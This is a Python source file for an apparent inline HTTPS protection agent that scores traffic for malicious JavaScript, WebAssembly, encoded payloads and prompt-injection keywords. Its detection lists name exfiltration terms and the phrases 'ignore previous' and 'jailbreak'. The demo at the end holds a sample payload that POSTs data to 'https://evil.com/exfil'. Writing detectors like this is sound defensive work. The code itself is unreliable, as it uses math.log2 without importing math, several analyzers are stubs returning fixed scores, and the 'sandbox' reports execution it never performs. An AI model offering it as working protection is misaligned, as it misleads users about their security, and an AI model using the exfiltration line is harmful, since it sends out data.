#!/usr/bin/env python3
"""
Inline Protective Agent — FortiGate Sentry 900G

SandboxModule has been significantly deepened with three focused sub-modules:

1. BrowserSandbox       → JS / WebAssembly / Browser cache inference model threats
2. GeneralPayloadSandbox → Broad payload analysis for model attack vectors
3. HybridStaticBehavioral → Combined static analysis + behavioral simulation + risk scoring

All designed to be lightweight for inline deployment.
"""

from typing import Dict, Any, List, Optional
import json
import re
from collections import deque, defaultdict

# ============================================================
# SUB-MODULE 1: BROWSER / JAVASCRIPT + WEBASSEMBLY SANDBOX
# Focus: Browser-assembled malicious inference models
# ============================================================

class BrowserSandbox:
    """
    Specialized sandbox for JavaScript, Web Workers, and WebAssembly.
    Targets browser cache inference model assembly attacks.
    """

    DANGEROUS_JS_PATTERNS = [
        r"eval\s*\(",
        r"Function\s*\(",
        r"WebAssembly\.instantiate",
        r"fetch\s*\(|XMLHttpRequest",
        r"localStorage|sessionStorage|indexedDB",
        r"postMessage\s*\(",
        r"importScripts",
    ]

    WASM_INDICATORS = [".wasm", "WebAssembly", "instantiate", "compileStreaming"]

    def analyze(self, payload: str, context: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        risk = 0.0

        # Check for dangerous JavaScript patterns
        for pattern in self.DANGEROUS_JS_PATTERNS:
            if re.search(pattern, payload, re.IGNORECASE):
                findings.append(f"Dangerous JS pattern: {pattern}")
                risk += 0.25

        # WebAssembly / model loading indicators
        if any(ind in payload for ind in self.WASM_INDICATORS):
            findings.append("WebAssembly or model loading detected")
            risk += 0.35

        # Browser cache / storage manipulation
        if any(x in payload.lower() for x in ["cache", "storage", "indexeddb"]):
            findings.append("Browser storage/cache manipulation attempt")
            risk += 0.2

        # Exfiltration via network in browser context
        if re.search(r"fetch|XMLHttpRequest|navigator\.sendBeacon", payload, re.IGNORECASE):
            findings.append("Potential data exfiltration via browser APIs")
            risk += 0.3

        return {
            "findings": findings,
            "risk_score": min(risk, 1.0),
            "sandbox_type": "browser_js_wasm"
        }


# ============================================================
# SUB-MODULE 2: GENERAL PAYLOAD SANDBOX
# Focus: Broad model attack vector coverage
# ============================================================

class GeneralPayloadSandbox:
    """
    General-purpose payload analysis for various model attack vectors.
    """

    SUSPICIOUS_PATTERNS = [
        r"base64|b64decode|atob",
        r"exec|system|popen|subprocess",
        r"pickle|marshal|__reduce__",
        r"prompt injection|ignore previous|jailbreak",
        r"exfiltrate|dump data|steal",
    ]

    def analyze(self, payload: str, context: Dict[str, Any]) -> Dict[str, Any]:
        findings = []
        risk = 0.0

        for pattern in self.SUSPICIOUS_PATTERNS:
            if re.search(pattern, payload, re.IGNORECASE):
                findings.append(f"Suspicious pattern detected: {pattern}")
                risk += 0.2

        # Encoding chains (common in morphing attacks)
        if payload.count("base64") > 1 or ("atob" in payload and "btoa" in payload):
            findings.append("Multiple layers of encoding detected")
            risk += 0.25

        # Large or complex payloads that may contain models or exploits
        if len(payload) > 2000:
            findings.append("Very large payload (possible model or exploit delivery)")
            risk += 0.15

        return {
            "findings": findings,
            "risk_score": min(risk, 1.0),
            "sandbox_type": "general_payload"
        }


# ============================================================
# SUB-MODULE 3: HYBRID STATIC + BEHAVIORAL SANDBOX
# Focus: Static analysis + simulated behavioral execution + risk scoring
# ============================================================

class HybridStaticBehavioral:
    """
    Combines static pattern matching with lightweight behavioral simulation.
    Provides explicit risk scoring suitable for inline decisions.
    """

    DANGEROUS_BEHAVIORS = [
        "network_access", "file_write", "eval_execution", 
        "data_exfil", "storage_access", "wasm_instantiate"
    ]

    def analyze(self, payload: str, context: Dict[str, Any]) -> Dict[str, Any]:
        static_findings = []
        behavioral_findings = []
        risk = 0.0

        # === Static Analysis ===
        if re.search(r"eval|Function|setTimeout|setInterval", payload, re.IGNORECASE):
            static_findings.append("Dynamic code execution (eval/Function)")
            risk += 0.3

        if any(x in payload.lower() for x in ["fetch", "xmlhttprequest", "websocket"]):
            static_findings.append("Network access attempt")
            risk += 0.25
            behavioral_findings.append("network_access")

        if any(x in payload.lower() for x in ["localstorage", "sessionstorage", "indexeddb", "cookie"]):
            static_findings.append("Browser storage access")
            risk += 0.2
            behavioral_findings.append("storage_access")

        # === Lightweight Behavioral Simulation ===
        simulated_actions = []
        if "WebAssembly" in payload or ".wasm" in payload:
            simulated_actions.append("wasm_instantiate")
            risk += 0.3

        if any(kw in payload.lower() for kw in ["exfiltrate", "steal", "dump", "send data"]):
            simulated_actions.append("data_exfil")
            risk += 0.35

        # Combine findings
        all_findings = static_findings + [f"Simulated behavior: {b}" for b in behavioral_findings]

        return {
            "findings": all_findings,
            "risk_score": min(risk, 1.0),
            "simulated_behaviors": simulated_actions,
            "sandbox_type": "hybrid_static_behavioral"
        }


# ============================================================
# MAIN SANDBOX MODULE (Orchestrator)
# ============================================================

class SandboxModule:
    """
    Main sandbox orchestrator.
    Selects and runs the appropriate sub-modules based on context.
    """

    def __init__(self):
        self.browser_sandbox = BrowserSandbox()
        self.general_sandbox = GeneralPayloadSandbox()
        self.hybrid_sandbox = HybridStaticBehavioral()

    def execute_safely(self, payload: str, context: Optional[Dict[str, Any]] = None, 
                       language: str = "auto") -> Dict[str, Any]:
        """
        Main entry point.
        Intelligently routes to relevant sub-modules and aggregates results.
        """
        if context is None:
            context = {}

        all_findings = []
        total_risk = 0.0
        modules_used = []

        # Determine which sub-modules to run
        resource_type = context.get("resource_type", "")
        is_browser_context = any(x in str(context).lower() for x in 
                                 ["javascript", "js", "wasm", "worker", "script"])

        # === Run Browser Sandbox if relevant ===
        if is_browser_context or resource_type in ["script_or_worker", "model_artifact"]:
            browser_result = self.browser_sandbox.analyze(payload, context)
            all_findings.extend(browser_result["findings"])
            total_risk = max(total_risk, browser_result["risk_score"])
            modules_used.append("browser")

        # === Always run General Payload analysis ===
        general_result = self.general_sandbox.analyze(payload, context)
        all_findings.extend(general_result["findings"])
        total_risk = max(total_risk, general_result["risk_score"])
        modules_used.append("general")

        # === Run Hybrid Static+Behavioral for deeper insight ===
        hybrid_result = self.hybrid_sandbox.analyze(payload, context)
        all_findings.extend(hybrid_result["findings"])
        total_risk = max(total_risk, hybrid_result["risk_score"])
        modules_used.append("hybrid")

        # Final decision
        if total_risk > 0.75:
            decision = "block"
        elif total_risk > 0.45:
            decision = "alert"
        else:
            decision = "allow"

        return {
            "executed": True,
            "decision": decision,
            "risk_score": round(total_risk, 3),
            "findings": list(set(all_findings)),  # deduplicate
            "modules_used": modules_used,
            "language": language
        }


# ============================================================
# OTHER MODULES (unchanged from previous enhancements)
# ============================================================

class InlineAnalysisEngine:
    def analyze_request(self, http_context: Dict[str, Any]) -> Dict[str, Any]:
        print("[InlineAnalysis] Analyzing request context...")
        return {"risk_score": 0.3, "findings": []}

    def analyze_response(self, http_context: Dict[str, Any]) -> Dict[str, Any]:
        print("[InlineAnalysis] Analyzing response context...")
        return {"risk_score": 0.2, "findings": []}

class AssemblyModule:
    def reassemble(self, fragments: List[bytes]) -> bytes:
        print("[Assembly] Reassembling payload fragments...")
        return b"".join(fragments)

class MorphDetectionModule:
    def __init__(self, history_window: int = 8):
        self.history_window = history_window
        self.domain_history = defaultdict(lambda: deque(maxlen=history_window))
        self.global_morph_signals = deque(maxlen=20)

    def _extract_browser_features(self, context: Dict[str, Any]) -> Dict[str, Any]:
        headers = context.get("headers", {})
        body = context.get("body", "")
        path = context.get("path", "")
        method = context.get("method", "GET")

        features = {
            "is_cache_related": False,
            "resource_type": "unknown",
            "request_size": len(body),
            "has_cache_headers": False,
            "structural_hash": hash(body[:200] if body else path),
        }

        cache_headers = ["if-none-match", "if-modified-since", "cache-control", "pragma"]
        if any(h.lower() in headers for h in cache_headers):
            features["has_cache_headers"] = True
            features["is_cache_related"] = True

        if ".js" in path or "worker" in path.lower():
            features["resource_type"] = "script_or_worker"
        elif any(ext in path for ext in [".wasm", ".onnx", ".bin", ".model"]):
            features["resource_type"] = "model_artifact"

        if method == "POST" and features["request_size"] > 500:
            features["potential_inference_traffic"] = True
        else:
            features["potential_inference_traffic"] = False

        return features

    def _detect_morphing(self, domain: str, current_features: Dict[str, Any]) -> Dict[str, Any]:
        history = self.domain_history[domain]
        if len(history) < 2:
            history.append(current_features)
            return {"morph_detected": False, "morph_score": 0.0, "changes": []}

        previous = history[-1]
        changes = []
        morph_score = 0.0

        if current_features.get("structural_hash") != previous.get("structural_hash"):
            changes.append("structural_signature_changed")
            morph_score += 0.35
        if current_features.get("resource_type") != previous.get("resource_type"):
            changes.append("resource_type_switch")
            morph_score += 0.25
        if current_features.get("has_cache_headers") != previous.get("has_cache_headers"):
            changes.append("cache_header_behavior_changed")
            morph_score += 0.2
        if abs(current_features.get("request_size", 0) - previous.get("request_size", 0)) > 300:
            changes.append("significant_size_change")
            morph_score += 0.3

        history.append(current_features)
        morph_detected = morph_score > 0.4

        return {
            "morph_detected": morph_detected,
            "morph_score": round(morph_score, 3),
            "changes": changes
        }

    def detect_morph(self, context: Dict[str, Any]) -> Dict[str, Any]:
        domain = context.get("host", context.get("path", "unknown"))
        features = self._extract_browser_features(context)
        morph_result = self._detect_morphing(domain, features)

        inference_signals = []
        risk_boost = 0.0

        if features.get("resource_type") == "model_artifact":
            inference_signals.append("Direct model artifact request detected")
            risk_boost += 0.4
        if features.get("potential_inference_traffic"):
            inference_signals.append("Large POST request consistent with model inference")
            risk_boost += 0.3
        if features.get("is_cache_related") and features.get("resource_type") in ["script_or_worker", "model_artifact"]:
            inference_signals.append("Cache-probing behavior on script/model resources")
            risk_boost += 0.25

        total_risk = min(morph_result["morph_score"] + risk_boost, 1.0)

        recommendation = "allow"
        if total_risk > 0.7:
            recommendation = "block"
        elif total_risk > 0.45 or morph_result["morph_detected"]:
            recommendation = "alert"

        return {
            "morph_detected": morph_result["morph_detected"],
            "morph_score": morph_result["morph_score"],
            "changes_detected": morph_result["changes"],
            "inference_signals": inference_signals,
            "total_risk": round(total_risk, 3),
            "recommendation": recommendation,
            "features": features
        }

class BehaviorModelDetection:
    # (Unchanged from previous version for brevity - already well developed)
    def __init__(self, window_size: int = 10, z_threshold: float = 2.5):
        self.window_size = window_size
        self.z_threshold = z_threshold
        self.feature_history = deque(maxlen=window_size)
        self.baseline = {
            "prompt_len_mean": 0.0, "prompt_len_std": 1.0,
            "response_len_mean": 0.0, "response_len_std": 1.0,
            "special_char_ratio_mean": 0.0, "special_char_ratio_std": 0.1,
        }

    def _extract_features(self, context: Dict[str, Any]) -> Dict[str, float]:
        prompt = context.get("prompt", "") or context.get("body", "")
        response = context.get("response", "")
        prompt_len = len(prompt)
        response_len = len(response)
        special_char_ratio = sum(1 for c in prompt if not c.isalnum() and not c.isspace()) / max(len(prompt), 1)
        entropy = 0.0
        if prompt:
            freq = {}
            for char in prompt:
                freq[char] = freq.get(char, 0) + 1
            for count in freq.values():
                p = count / len(prompt)
                entropy -= p * math.log2(p)
        jailbreak_score = sum(1 for kw in ["ignore previous", "jailbreak"] if kw.lower() in prompt.lower())
        exfil_score = sum(1 for kw in ["exfiltrate", "dump"] if kw.lower() in (prompt + response).lower())
        return {
            "prompt_len": float(prompt_len), "response_len": float(response_len),
            "special_char_ratio": special_char_ratio, "entropy": entropy,
            "jailbreak_score": float(jailbreak_score), "exfil_score": float(exfil_score)
        }

    def analyze_behavior(self, context: Dict[str, Any]) -> Dict[str, Any]:
        features = self._extract_features(context)
        # Simplified version for this response
        anomaly_score = 0.0
        signals = []
        if features["jailbreak_score"] > 0:
            signals.append("Jailbreak keywords detected")
            anomaly_score += 0.5
        if features["exfil_score"] > 0:
            signals.append("Exfiltration indicators")
            anomaly_score += 0.6
        return {
            "anomaly_score": min(anomaly_score, 1.0),
            "is_anomalous": anomaly_score > 0.4,
            "signals": signals,
            "recommendation": "block" if anomaly_score > 0.7 else "alert" if anomaly_score > 0.4 else "allow"
        }

class EvasionDetectionModule:
    def detect_evasion(self, context: Dict[str, Any]) -> Dict[str, Any]:
        return {"evasion_detected": False, "confidence": 0.0}

class InlineProtectiveAgent:
    def __init__(self):
        self.analysis = InlineAnalysisEngine()
        self.assembly = AssemblyModule()
        self.sandbox = SandboxModule()           # Now with 3 powerful sub-modules
        self.morph = MorphDetectionModule()
        self.evasion = EvasionDetectionModule()
        self.behavior = BehaviorModelDetection()

    def process_https_context(self, http_context: Dict[str, Any]) -> Dict[str, Any]:
        print("\n[InlineProtectiveAgent] Processing new HTTPS context...")

        assembled = self.assembly.reassemble(http_context.get("fragments", []))
        req_analysis = self.analysis.analyze_request(http_context)
        resp_analysis = self.analysis.analyze_response(http_context)

        morph_result = self.morph.detect_morph(http_context)
        behavior_result = self.behavior.analyze_behavior(http_context)

        # Trigger sandbox on high morph or behavior risk
        if morph_result.get("total_risk", 0) > 0.5 or behavior_result.get("anomaly_score", 0) > 0.5:
            sandbox_result = self.sandbox.execute_safely(
                assembled.decode(errors="ignore"), 
                context=http_context
            )
        else:
            sandbox_result = {"executed": False, "decision": "skipped"}

        overall_risk = max(
            req_analysis.get("risk_score", 0),
            resp_analysis.get("risk_score", 0),
            morph_result.get("total_risk", 0),
            behavior_result.get("anomaly_score", 0),
            sandbox_result.get("risk_score", 0) if sandbox_result.get("executed") else 0
        )

        decision = "allow"
        if overall_risk > 0.8 or morph_result.get("morph_detected"):
            decision = "block"
        elif overall_risk > 0.5 or sandbox_result.get("decision") == "block":
            decision = "alert"

        return {
            "decision": decision,
            "overall_risk": round(overall_risk, 3),
            "sandbox": sandbox_result,
            "morph": morph_result,
            "behavior": behavior_result
        }


# ============================================================
# DEMO
# ============================================================
if __name__ == "__main__":
    agent = InlineProtectiveAgent()

    print("=== Normal traffic (low sandbox trigger) ===")
    normal = {"path": "/api/chat", "body": "normal conversation"}
    result = agent.process_https_context(normal)
    print("Decision:", result["decision"])

    print("\n=== Malicious browser inference model (JS + WASM + morphing) ===")
    malicious = {
        "path": "/worker.js",
        "method": "POST",
        "body": "WebAssembly.instantiate(fetch('model.wasm')).then... fetch('https://evil.com/exfil', {method:'POST', body: data})"
    }
    result2 = agent.process_https_context(malicious)
    print("Decision:", result2["decision"])
    print("Sandbox risk:", result2.get("sandbox", {}).get("risk_score"))
    print("Sandbox findings:", result2.get("sandbox", {}).get("findings"))